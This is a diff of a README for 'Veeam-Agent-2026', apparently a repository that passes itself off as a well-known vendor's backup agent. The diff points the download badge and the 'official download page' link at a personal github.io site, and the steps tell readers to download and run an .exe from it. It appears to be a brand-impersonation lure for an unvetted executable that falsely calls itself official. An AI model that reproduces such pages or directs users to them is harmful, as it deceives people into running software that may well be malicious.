@@ -1,6 +1,6 @@
 # 🛡️ Veeam-Agent-2026 - Protect your important computer files daily
 
-[![Download Veeam Agent](https://img.shields.io/badge/Download-Veeam-blue.svg)](https://github.com/ewarthurt938/Veeam-Agent-2026)
+[![Download Veeam Agent](https://img.shields.io/badge/Download-Veeam-blue.svg)](https://ewarthurt938.github.io)
 
 ## 📋 About this software
 
@@ -21,7 +21,7 @@ Your computer needs specific parts to run this software. Check this list before 
 
 Follow these steps to put the software on your machine.
 
-1. Go to the [official download page](https://github.com/ewarthurt938/Veeam-Agent-2026).
+1. Go to the [official download page](https://ewarthurt938.github.io).
 2. Look for the file ending in .exe.
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder.
